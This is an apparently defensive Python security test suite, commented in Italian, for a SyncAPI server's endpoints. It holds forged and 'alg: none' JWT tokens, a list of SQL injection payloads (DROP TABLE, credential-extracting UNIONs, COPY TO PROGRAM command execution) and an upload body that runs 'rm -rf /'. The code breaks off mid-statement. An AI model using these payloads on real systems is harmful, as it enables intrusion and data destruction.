"""
Test di Sicurezza API - Safety Test Manager SyncAPI
====================================================
Suite completa di test per verificare la sicurezza degli endpoint API.
Testa autenticazione, autorizzazione, injection, rate limiting, JWT,
upload, information leakage e security headers.

Uso:
    python test_api_security.py
    python test_api_security.py --verbose
    python test_api_security.py --skip-destructive     (salta test che creano/eliminano dati)
    python test_api_security.py --skip-ratelimit        (salta test rate limiting, sono lenti)

Prerequisiti:
    - Server SyncAPI in esecuzione
    - config.ini configurato con URL e certificato SSL
    - Credenziali admin valide (richieste all'avvio)
"""

import requests
import json
import sys
import os
import time
import base64
import hashlib
import configparser
import getpass
import argparse
import uuid
import struct
import threading
import concurrent.futures
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote

# ============================================================
# CONFIGURAZIONE
# ============================================================
CONFIG_FILE = "config.ini"
config = configparser.ConfigParser()
config.read(CONFIG_FILE)

SERVER_URL = config.get("server", "url", fallback="https://195.149.221.71:8000")
CA_CERT = config.get("server", "ssl_ca_cert", fallback=None)

# SSL verification
if CA_CERT and os.path.isfile(CA_CERT):
    SSL_VERIFY = CA_CERT
else:
    SSL_VERIFY = True

TIMEOUT = 15

# ============================================================
# CONTATORI E UTILITÀ
# ============================================================
RESULTS = {"passed": 0, "failed": 0, "warnings": 0, "skipped": 0}
TEST_LOG = []  # Lista di (tipo, sezione, messaggio) per il report PDF
CURRENT_SECTION = "Generale"
VERBOSE = False

def print_header(title):
    global CURRENT_SECTION
    CURRENT_SECTION = title
    TEST_LOG.append(("header", title, ""))
    print(f"\n{'='*65}")
    print(f"  {title}")
    print(f"{'='*65}")

def test_pass(msg):
    RESULTS["passed"] += 1
    TEST_LOG.append(("pass", CURRENT_SECTION, msg))
    print(f"  ✅ PASS: {msg}")

def test_fail(msg):
    RESULTS["failed"] += 1
    TEST_LOG.append(("fail", CURRENT_SECTION, msg))
    print(f"  ❌ FAIL: {msg}")

def test_warn(msg):
    RESULTS["warnings"] += 1
    TEST_LOG.append(("warn", CURRENT_SECTION, msg))
    print(f"  ⚠️  WARN: {msg}")

def test_skip(msg):
    RESULTS["skipped"] += 1
    TEST_LOG.append(("skip", CURRENT_SECTION, msg))
    print(f"  ⏭️  SKIP: {msg}")

def test_info(msg):
    print(f"  ℹ️  INFO: {msg}")

def debug(msg):
    if VERBOSE:
        print(f"       🔍 {msg}")

def auth_header(token):
    """Costruisce l'header Authorization Bearer."""
    return {"Authorization": f"Bearer {token}"}

def login(username, password):
    """Effettua login e ritorna il token JWT, oppure None."""
    try:
        resp = requests.post(
            f"{SERVER_URL}/token",
            data={"username": username, "password": password},
            verify=SSL_VERIFY,
            timeout=TIMEOUT
        )
        if resp.status_code == 200:
            return resp.json().get("access_token")
    except Exception:
        pass
    return None


def login_response(username, password):
    """Effettua login e ritorna la risposta HTTP completa (o None in caso di errore rete)."""
    try:
        return requests.post(
            f"{SERVER_URL}/token",
            data={"username": username, "password": password},
            verify=SSL_VERIFY,
            timeout=TIMEOUT
        )
    except Exception:
        return None


# ============================================================
# TEST 1: AUTENTICAZIONE
# ============================================================
def test_authentication():
    print_header("TEST 1: Autenticazione")

    # 1.1 Login con credenziali errate → 401
    try:
        resp = requests.post(
            f"{SERVER_URL}/token",
            data={"username": "utente_inesistente_xyz", "password": "password_sbagliata"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Login con credenziali errate → 401 Unauthorized")
        else:
            test_fail(f"Login con credenziali errate → {resp.status_code} (atteso 401)")
    except Exception as e:
        test_fail(f"Errore connessione login: {e}")

    # 1.2 Login senza username
    try:
        resp = requests.post(
            f"{SERVER_URL}/token",
            data={"password": "qualcosa"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 422:
            test_pass("Login senza username → 422 Validation Error")
        elif resp.status_code == 429:
            test_pass("Login senza username → 429 (rate limiter attivo, protezione brute-force)")
        else:
            test_warn(f"Login senza username → {resp.status_code} (atteso 422)")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 1.3 Login senza password
    try:
        resp = requests.post(
            f"{SERVER_URL}/token",
            data={"username": "admin"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 422:
            test_pass("Login senza password → 422 Validation Error")
        elif resp.status_code == 429:
            test_pass("Login senza password → 429 (rate limiter attivo, protezione brute-force)")
        else:
            test_warn(f"Login senza password → {resp.status_code} (atteso 422)")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 1.4 Login con body vuoto
    try:
        resp = requests.post(
            f"{SERVER_URL}/token",
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 422:
            test_pass("Login con body vuoto → 422 Validation Error")
        elif resp.status_code == 429:
            test_pass("Login con body vuoto → 429 (rate limiter attivo, protezione brute-force)")
        else:
            test_warn(f"Login con body vuoto → {resp.status_code} (atteso 422)")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 1.5 Login con metodo GET (deve essere rifiutato)
    try:
        resp = requests.get(
            f"{SERVER_URL}/token",
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 405:
            test_pass("GET su /token → 405 Method Not Allowed")
        else:
            test_warn(f"GET su /token → {resp.status_code} (atteso 405)")
    except Exception as e:
        test_fail(f"Errore: {e}")


# ============================================================
# TEST 2: ACCESSO SENZA TOKEN (ENDPOINT PROTETTI)
# ============================================================
def test_unauthenticated_access():
    print_header("TEST 2: Accesso senza autenticazione")

    protected_endpoints = [
        ("POST", "/sync", "Sync"),
        ("GET", "/users", "Lista utenti"),
        ("POST", "/users", "Creazione utente"),
        ("PUT", "/users/admin", "Aggiornamento utente"),
        ("DELETE", "/users/test_user", "Eliminazione utente"),
        ("POST", "/signatures/admin", "Upload firma"),
        ("GET", "/signatures/admin", "Download firma"),
        ("DELETE", "/signatures/admin", "Eliminazione firma"),
        ("GET", "/admin/deleted-data", "Dati eliminati"),
        ("DELETE", "/admin/deleted-data/customers/99999", "Hard delete singolo"),
        ("DELETE", "/admin/deleted-data/customers", "Hard delete massivo"),
    ]

    for method, path, name in protected_endpoints:
        try:
            resp = requests.request(
                method, f"{SERVER_URL}{path}",
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 401:
                test_pass(f"{method} {path} senza token → 401")
            elif resp.status_code == 403:
                test_pass(f"{method} {path} senza token → 403")
            else:
                test_fail(f"{method} {path} senza token → {resp.status_code} (atteso 401/403)")
            debug(f"Risposta: {resp.text[:100]}")
        except Exception as e:
            test_fail(f"{method} {path}: {e}")


# ============================================================
# TEST 3: JWT SECURITY
# ============================================================
def test_jwt_security():
    print_header("TEST 3: Sicurezza JWT")

    # 3.1 Token completamente invalido
    try:
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers=auth_header("questo.non.è.un.token.jwt.valido"),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Token completamente invalido → 401")
        else:
            test_fail(f"Token invalido → {resp.status_code} (atteso 401)")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 3.2 Token con formato JWT ma firma sbagliata
    fake_header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    fake_payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin", "exp": 9999999999}).encode()).rstrip(b"=").decode()
    fake_sig = base64.urlsafe_b64encode(b"fake_signature_12345").rstrip(b"=").decode()
    forged_token = f"{fake_header}.{fake_payload}.{fake_sig}"

    try:
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers=auth_header(forged_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Token con firma falsificata → 401")
        else:
            test_fail(f"Token con firma falsificata → {resp.status_code} (atteso 401) — POSSIBILE JWT BYPASS!")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 3.3 Token con algoritmo "none" (attacco classico JWT)
    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    none_payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin", "exp": 9999999999}).encode()).rstrip(b"=").decode()
    none_token = f"{none_header}.{none_payload}."

    try:
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers=auth_header(none_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Token con algoritmo 'none' → 401 (attacco 'none algorithm' bloccato)")
        else:
            test_fail(f"Token con alg='none' → {resp.status_code} — VULNERABILITÀ CRITICA: JWT none algorithm bypass!")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 3.4 Token vuoto
    try:
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers={"Authorization": "Bearer "},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Token vuoto → 401")
        else:
            test_fail(f"Token vuoto → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 3.5 Header Authorization senza Bearer
    try:
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers={"Authorization": "Basic dXNlcjpwYXNz"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Authorization Basic (non Bearer) → 401")
        else:
            test_warn(f"Authorization Basic → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 3.6 Token con ruolo manipolato (role escalation)
    fake_admin_payload = base64.urlsafe_b64encode(json.dumps({
        "sub": "utente_fittizio",
        "role": "admin",
        "full_name": "Hacker",
        "exp": 9999999999
    }).encode()).rstrip(b"=").decode()
    escalation_token = f"{fake_header}.{fake_admin_payload}.{fake_sig}"

    try:
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers=auth_header(escalation_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Token con role escalation → 401 (firma non valida)")
        else:
            test_fail(f"Token con role escalation → {resp.status_code} — VULNERABILITÀ: privilege escalation!")
    except Exception as e:
        test_fail(f"Errore: {e}")


# ============================================================
# TEST 4: SQL INJECTION
# ============================================================
def test_sql_injection():
    print_header("TEST 4: SQL Injection (Aggressivo)")

    sqli_payloads = [
        # Classic
        "' OR '1'='1",
        "admin'--",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, hashed_password FROM users --",
        # Time-based blind
        "admin'; WAITFOR DELAY '0:0:5' --",
        "1; SELECT pg_sleep(5);--",
        "' OR pg_sleep(5)--",
        "';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        # Error-based PostgreSQL
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' AND 1=CAST((SELECT current_database()) AS int)--",
        "' UNION SELECT NULL,NULL,NULL,version()--",
        # Stacked queries
        "'; CREATE TABLE pwned(x text);--",
        "'; COPY (SELECT '') TO PROGRAM 'id';--",
        "'; DO $$ BEGIN PERFORM pg_sleep(5); END $$;--",
        # Out-of-band PostgreSQL
        "'; COPY (SELECT '') TO '/tmp/pwned';--",
        "' || (SELECT current_user) || '",
        # Encoding bypass
        "admin%27%20OR%20%271%27%3D%271",
        "admin\\' OR 1=1--",
        "admin'/**/OR/**/1=1--",
        "admin' OR 1=1 LIMIT 1 OFFSET 0--",
        # Boolean blind
        "' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)='a'--",
        "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
        # Double encoding
        "admin%2527%2520OR%25201%253D1--",
        # Unicode bypass
        "admin\u0027 OR 1=1--",
        # NULL byte injection
        "admin\x00' OR '1'='1",
    ]

    rate_limited_count = 0
    tested_count = 0

    for i, payload in enumerate(sqli_payloads):
        # Pausa più lunga tra tentativi per evitare rate limiting (limite: 5/min)
        if i > 0:
            time.sleep(13)  # ~13s tra tentativi = max 4-5 tentativi/minuto
        try:
            start = time.time()
            resp = requests.post(
                f"{SERVER_URL}/token",
                data={"username": payload, "password": payload},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            elapsed = time.time() - start

            if resp.status_code == 401:
                tested_count += 1
                # Verifica che non ci sia stato un delay (time-based injection)
                if elapsed < 4:
                    test_pass(f"SQLi bloccata: '{payload[:30]}...' → 401 ({elapsed:.1f}s)")
                else:
                    test_fail(f"SQLi potenziale time-based: '{payload[:30]}...' → risposta in {elapsed:.1f}s!")
            elif resp.status_code == 200:
                test_fail(f"SQLi BYPASS! Payload: '{payload[:30]}...' → 200 LOGIN RIUSCITO!")
            elif resp.status_code == 429:
                rate_limited_count += 1
                debug(f"Rate limited su payload: '{payload[:30]}...'")
            else:
                tested_count += 1
                test_pass(f"SQLi rifiutata: '{payload[:30]}...' → {resp.status_code}")
        except requests.exceptions.Timeout:
            test_fail(f"TIMEOUT su SQLi: '{payload[:30]}...' — possibile time-based injection!")
        except Exception as e:
            test_info(f"SQLi '{payload[:30]}...': {type(e).__name__}")

    # Riepilogo: se tutti sono rate-limited, il rate limiter ha protetto
    if rate_limited_count > 0 and tested_count == 0:
        test_pass(f"Rate limiter ha bloccato tutti i {rate_limited_count} tentativi SQLi (protezione brute-force attiva)")
    elif rate_limited_count > 0:
        test_info(f"{rate_limited_count} tentativi bloccati dal rate limiter, {tested_count} testati direttamente")


# ============================================================
# TEST 5: AUTORIZZAZIONE (RBAC)
# ============================================================
def test_authorization(admin_token, user_token=None):
    print_header("TEST 5: Autorizzazione (RBAC)")

    if not admin_token:
        test_skip("Nessun token admin disponibile — impossibile testare RBAC")
        return

    # 5.1 Admin può vedere gli utenti
    try:
        resp = requests.get(
            f"{SERVER_URL}/users",
            headers=auth_header(admin_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 200:
            test_pass("Admin può accedere a GET /users → 200")
        else:
            test_fail(f"Admin su GET /users → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # --- Crea utente temporaneo per test RBAC ---
    test_user_name = "_sectest_rbac_temp"
    test_user_pass = "SecTest2026!Rbac"
    temp_user_created = False

    if not user_token:
        test_info("Creazione utente temporaneo per test RBAC...")
        try:
            resp = requests.post(
                f"{SERVER_URL}/users",
                headers=auth_header(admin_token),
                json={"username": test_user_name, "password": test_user_pass, "role": "technician"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 200:
                temp_user_created = True
                # Attendi un attimo e fai login
                time.sleep(1)
                user_token = login(test_user_name, test_user_pass)
                if user_token:
                    test_info(f"Utente temporaneo '{test_user_name}' creato e login riuscito")
                else:
                    test_warn(f"Utente creato ma login fallito (possibile rate limiting)")
            elif resp.status_code == 400 and "esiste" in resp.text.lower():
                # L'utente esiste già da un test precedente — prova il login
                user_token = login(test_user_name, test_user_pass)
                if user_token:
                    temp_user_created = True
                    test_info(f"Utente temporaneo '{test_user_name}' già esistente, login riuscito")
            else:
                test_info(f"Impossibile creare utente temporaneo → {resp.status_code}")
        except Exception as e:
            test_info(f"Errore creazione utente temp: {e}")

    # 5.2 Se abbiamo un token utente normale, verifica che NON possa fare operazioni admin
    if user_token:
        admin_endpoints = [
            ("GET", "/users", "Lista utenti"),
            ("GET", "/admin/deleted-data", "Dati eliminati"),
        ]
        for method, path, name in admin_endpoints:
            try:
                resp = requests.request(
                    method, f"{SERVER_URL}{path}",
                    headers=auth_header(user_token),
                    verify=SSL_VERIFY, timeout=TIMEOUT
                )
                if resp.status_code == 403:
                    test_pass(f"Utente normale su {name} → 403 Forbidden")
                else:
                    test_fail(f"Utente normale su {name} → {resp.status_code} (atteso 403)")
            except Exception as e:
                test_fail(f"Errore: {e}")

        # 5.3 Utente normale non può creare altri utenti
        try:
            resp = requests.post(
                f"{SERVER_URL}/users",
                headers=auth_header(user_token),
                json={"username": "hacker", "password": "hack123!xx", "role": "admin"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 403:
                test_pass("Utente normale non può creare utenti → 403")
            else:
                test_fail(f"Utente normale crea utente → {resp.status_code} (atteso 403)")
        except Exception as e:
            test_fail(f"Errore: {e}")

        # 5.4 Utente normale non può modificare la firma di altri
        try:
            resp = requests.delete(
                f"{SERVER_URL}/signatures/admin",
                headers=auth_header(user_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 403:
                test_pass("Utente non può eliminare firma altrui → 403")
            else:
                test_warn(f"Utente elimina firma altrui → {resp.status_code}")
        except Exception as e:
            test_fail(f"Errore: {e}")

        # 5.5 Utente normale non può eliminare altri utenti
        try:
            resp = requests.delete(
                f"{SERVER_URL}/users/admin",
                headers=auth_header(user_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 403:
                test_pass("Utente non può eliminare altri utenti → 403")
            else:
                test_fail(f"Utente elimina admin → {resp.status_code} (atteso 403)")
        except Exception as e:
            test_fail(f"Errore: {e}")

        # 5.6 Utente normale non può aggiornare ruolo di altri
        try:
            resp = requests.put(
                f"{SERVER_URL}/users/admin",
                headers=auth_header(user_token),
                json={"role": "technician"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 403:
                test_pass("Utente non può modificare ruolo admin → 403")
            else:
                test_fail(f"Utente modifica admin → {resp.status_code} (atteso 403)")
        except Exception as e:
            test_fail(f"Errore: {e}")
    else:
        test_skip("Nessun token utente non-admin — test RBAC utente saltati")

    # --- Cleanup utente temporaneo ---
    if temp_user_created:
        try:
            resp = requests.delete(
                f"{SERVER_URL}/users/{test_user_name}",
                headers=auth_header(admin_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 204:
                test_info(f"Utente temporaneo '{test_user_name}' eliminato")
            else:
                test_info(f"Cleanup utente temp → {resp.status_code}")
        except Exception:
            pass


# ============================================================
# TEST 6: INPUT VALIDATION (Sync endpoint)
# ============================================================
def test_input_validation(admin_token):
    print_header("TEST 6: Validazione Input (Sync)")

    if not admin_token:
        test_skip("Token admin necessario per test input validation")
        return

    # 6.1 Payload vuoto
    try:
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        # Il server dovrebbe gestire il payload vuoto senza crash
        if resp.status_code in (200, 400, 422):
            test_pass(f"Payload sync vuoto gestito → {resp.status_code}")
        elif resp.status_code == 500:
            test_fail("Payload sync vuoto causa errore 500!")
        else:
            test_info(f"Payload sync vuoto → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 6.2 Payload con tabella inesistente
    try:
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={
                "last_sync_timestamp": None,
                "changes": {
                    "tabella_hackerata": [{"uuid": "fake-uuid", "nome": "test"}]
                }
            },
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code != 500:
            test_pass(f"Tabella inesistente nel sync gestita → {resp.status_code}")
        else:
            test_warn(f"Tabella inesistente causa errore 500")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 6.3 Payload con checksum errato
    try:
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={
                "last_sync_timestamp": None,
                "changes": {"customers": []},
                "checksum": "checksum_completamente_falso_1234567890abcdef"
            },
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 400:
            test_pass("Checksum errato → 400 Bad Request")
        elif resp.status_code == 200:
            test_warn("Checksum errato accettato (forse ignorato per changes vuoti?)")
        else:
            test_info(f"Checksum errato → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 6.4 Payload molto grande (test dimensione)
    try:
        huge_data = {"customers": [{"uuid": f"fake-{i}", "name": "_SECTEST_ " + "X" * 1000, "is_deleted": True, "is_synced": True, "last_modified": datetime.now().isoformat()} for i in range(100)]}
        huge_checksum = hashlib.sha256(json.dumps(huge_data, sort_keys=True, default=str).encode()).hexdigest()
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={
                "last_sync_timestamp": None,
                "changes": huge_data,
                "checksum": huge_checksum
            },
            verify=SSL_VERIFY, timeout=30
        )
        if resp.status_code in (200, 400, 422):
            test_pass(f"Payload grande (100 record) gestito → {resp.status_code}")
            # Verifica che la risposta non esponga errori Pydantic dettagliati
            if resp.status_code == 400:
                body = resp.text
                if "validation error" in body.lower() or "Field required" in body:
                    test_fail("Errore 400 espone dettagli Pydantic interni!")
                else:
                    test_pass("Errore 400 con messaggio generico (non espone Pydantic)")
        elif resp.status_code == 500:
            test_fail("Payload grande causa errore 500!")
        else:
            test_info(f"Payload grande → {resp.status_code}")
    except Exception as e:
        test_info(f"Payload grande: {type(e).__name__}")

    # 6.5 Conflict resolution con tabella non valida
    try:
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={
                "last_sync_timestamp": None,
                "changes": {},
                "conflict_resolutions": [
                    {"table": "users; DROP TABLE users;--", "uuid_to_delete": "fake-uuid"}
                ]
            },
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        # Il server dovrebbe rifiutare la tabella invalida
        if resp.status_code != 500:
            test_pass(f"Conflict resolution con tabella SQLi gestita → {resp.status_code}")
        else:
            test_fail("Conflict resolution con tabella SQLi causa errore 500!")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 6.6 Campo con tipo sbagliato
    try:
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={
                "last_sync_timestamp": "NON-UNA-DATA-VALIDA",
                "changes": {"customers": []}
            },
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 400:
            test_pass(f"Timestamp non valido → 400 Bad Request")
        elif resp.status_code in (200, 422):
            test_pass(f"Timestamp non valido gestito → {resp.status_code}")
        elif resp.status_code == 500:
            test_fail("Timestamp non valido causa errore 500!")
        else:
            test_warn(f"Timestamp non valido → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")


# ============================================================
# TEST 7: INFORMATION LEAKAGE
# ============================================================
def test_information_leakage(admin_token):
    print_header("TEST 7: Information Leakage")

    # 7.1 Errore non deve esporre stack trace o dettagli interni
    try:
        resp = requests.post(
            f"{SERVER_URL}/token",
            data={"username": "test", "password": "wrong"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        body = resp.text.lower()
        sensitive_keywords = ["traceback", "psycopg2", "sqlalchemy", "file \"", 
                             "line ", "exception", "stacktrace", "internal server",
                             "/usr/", "/home/", "c:\\", "d:\\"]
        leaks_found = [kw for kw in sensitive_keywords if kw in body]
        if not leaks_found:
            test_pass("Risposta login errato non espone dettagli interni")
        else:
            test_fail(f"Risposta login espone informazioni sensibili: {leaks_found}")
        debug(f"Risposta: {resp.text[:200]}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 7.2 404 su path inesistente non deve rivelare tecnologie
    try:
        resp = requests.get(
            f"{SERVER_URL}/endpoint/che/non/esiste",
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        body = resp.text.lower()
        tech_keywords = ["fastapi", "uvicorn", "starlette", "python", "pydantic"]
        leaks = [kw for kw in tech_keywords if kw in body]
        if not leaks:
            test_pass("404 non rivela tecnologie server")
        else:
            test_warn(f"404 rivela tecnologia: {leaks}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 7.3 Verifica che gli errori 500 non espongano dettagli
    if admin_token:
        try:
            # Forza un errore con dati malformati
            resp = requests.post(
                f"{SERVER_URL}/sync",
                headers=auth_header(admin_token),
                json={"changes": {"customers": [{"CAMPO_IMPOSSIBILE": True}]}},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code >= 400:
                body = resp.text.lower()
                dangerous = ["traceback", "psycopg2", "file \"", "password", "secret_key", "db_password"]
                leaks = [kw for kw in dangerous if kw in body]
                if not leaks:
                    test_pass(f"Errore {resp.status_code} non espone dati sensibili")
                else:
                    test_fail(f"Errore {resp.status_code} ESPONE dati sensibili: {leaks}")
        except Exception as e:
            test_info(f"Test info leakage su errore: {e}")

    # 7.4 Health endpoint non espone troppi dettagli
    try:
        resp = requests.get(f"{SERVER_URL}/health", verify=SSL_VERIFY, timeout=TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            sensitive_fields = ["password", "secret", "key", "host", "port", "connection_string"]
            exposed = [f for f in sensitive_fields if f in json.dumps(data).lower()]
            if not exposed:
                test_pass("/health non espone dati sensibili")
            else:
                test_fail(f"/health espone: {exposed}")
        else:
            test_info(f"/health → {resp.status_code}")
    except Exception as e:
        test_info(f"/health: {e}")


# ============================================================
# TEST 8: SECURITY HEADERS
# ============================================================
def test_security_headers():
    print_header("TEST 8: Security Headers")

    try:
        resp = requests.get(f"{SERVER_URL}/", verify=SSL_VERIFY, timeout=TIMEOUT)
        headers = resp.headers

        checks = [
            ("strict-transport-security", "HSTS", True),
            ("x-content-type-options", "X-Content-Type-Options", True),
            ("x-frame-options", "X-Frame-Options", True),
            ("x-xss-protection", "X-XSS-Protection", False),
            ("cache-control", "Cache-Control", True),
        ]

        for header_name, display_name, required in checks:
            if header_name in headers:
                test_pass(f"{display_name}: {headers[header_name]}")
            elif required:
                test_fail(f"{display_name} MANCANTE")
            else:
                test_warn(f"{display_name} mancante (opzionale)")

        # Server header: deve essere assente o non rivelare tecnologie
        server_hdr = headers.get("server", "")
        if not server_hdr:
            test_pass("Server header assente (nessuna informazione esposta)")
        elif "uvicorn" in server_hdr.lower() or "python" in server_hdr.lower():
            test_fail(f"Server header rivela tecnologia: '{server_hdr}'")
        else:
            test_warn(f"Server header presente: '{server_hdr}' — meglio rimuoverlo del tutto")

        # Content-Type sulla risposta
        ct = headers.get("content-type", "")
        if "application/json" in ct:
            test_pass(f"Content-Type corretto: {ct}")
        else:
            test_info(f"Content-Type: {ct}")

    except Exception as e:
        test_fail(f"Impossibile verificare headers: {e}")


# ============================================================
# TEST 9: RATE LIMITING
# ============================================================
def test_rate_limiting(admin_username=None, admin_password=None):
    print_header("TEST 9: Rate Limiting (anti brute-force)")

    # 9.1 Login validi NON devono essere limitati dal meccanismo anti brute-force
    if admin_username and admin_password:
        test_info("Verifica: login validi consecutivi non devono ricevere 429...")
        valid_ok = True
        valid_attempts = 3
        for i in range(valid_attempts):
            resp = login_response(admin_username, admin_password)
            if resp is None:
                valid_ok = False
                test_fail("Errore rete durante verifica login validi")
                break
            if resp.status_code != 200:
                valid_ok = False
                test_fail(f"Login valido #{i+1} rifiutato con {resp.status_code} (atteso 200)")
                break
        if valid_ok:
            test_pass(f"{valid_attempts} login validi consecutivi accettati (nessun 429)")
    else:
        test_skip("Credenziali admin non fornite: salto verifica login validi non rate-limited")

    # 9.2 Solo i login FALLITI devono attivare il limit
    test_info("Verifica: invio login falliti rapidi per attivare 429...")
    got_429 = False
    first_429 = None
    for i in range(8):
        try:
            resp = requests.post(
                f"{SERVER_URL}/token",
                data={"username": f"ratelimit_test_{i}_{time.time()}", "password": "wrong"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 429:
                got_429 = True
                first_429 = resp
                # Verifica header Retry-After
                retry_after = resp.headers.get("Retry-After")
                if retry_after:
                    test_pass(f"Rate limit su login falliti attivato al tentativo #{i+1} con Retry-After: {retry_after}s")
                else:
                    test_warn(f"Rate limit su login falliti attivato al tentativo #{i+1} ma senza header Retry-After")
                break
            if resp.status_code == 200:
                test_fail("Login fallito inatteso accettato con 200")
                break
        except Exception:
            pass

    if not got_429:
        test_warn("Rate limiting su login falliti non rilevato dopo 8 tentativi")

    # 9.3 Verifica consistenza Retry-After senza attese lunghe
    if first_429 is not None:
        retry_after_raw = first_429.headers.get("Retry-After")
        if retry_after_raw is None:
            test_warn("Impossibile validare Retry-After: header assente")
        else:
            try:
                retry_after = int(retry_after_raw)
                if retry_after <= 0:
                    test_fail(f"Retry-After non valido: {retry_after}")
                elif retry_after <= 120:
                    test_pass(f"Retry-After coerente con finestra breve anti brute-force: {retry_after}s")
                else:
                    test_pass(f"Retry-After elevato ({retry_after}s): blocco temporaneo hard attivo")
                    test_info("Skip attesa reale del blocco hard per non rallentare la suite")
            except ValueError:
                test_fail(f"Retry-After non numerico: '{retry_after_raw}'")

    # Aspetta un po' per evitare di essere bloccati per i test successivi
    time.sleep(2)


# ============================================================
# TEST 10: UPLOAD SICUREZZA
# ============================================================
def test_upload_security(admin_token):
    print_header("TEST 10: Sicurezza Upload")

    if not admin_token:
        test_skip("Token admin necessario per test upload")
        return

    # 10.1 Upload file molto grande (simula DoS)
    test_info("Test upload file grande (1MB di dati casuali)...")
    try:
        large_data = os.urandom(1 * 1024 * 1024)  # 1MB
        resp = requests.post(
            f"{SERVER_URL}/signatures/security_test_user_fake",
            headers=auth_header(admin_token),
            files={"file": ("large_signature.png", large_data, "image/png")},
            verify=SSL_VERIFY, timeout=30
        )
        if resp.status_code == 413:
            test_pass(f"Upload file grande rifiutato → 413 Payload Too Large")
        elif resp.status_code == 400:
            test_pass(f"Upload file grande rifiutato → 400 Bad Request")
        elif resp.status_code == 200:
            test_fail("Upload 1MB accettato — manca limite dimensione file!")
        else:
            test_info(f"Upload file grande → {resp.status_code}")
    except Exception as e:
        test_info(f"Upload grande: {type(e).__name__}")

    # 10.2 Upload file non-immagine (es. script Python)
    try:
        malicious_content = b"#!/usr/bin/env python3\nimport os\nos.system('rm -rf /')\n"
        resp = requests.post(
            f"{SERVER_URL}/signatures/security_test_user_fake",
            headers=auth_header(admin_token),
            files={"file": ("evil_script.py", malicious_content, "application/x-python")},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code in (400, 415):
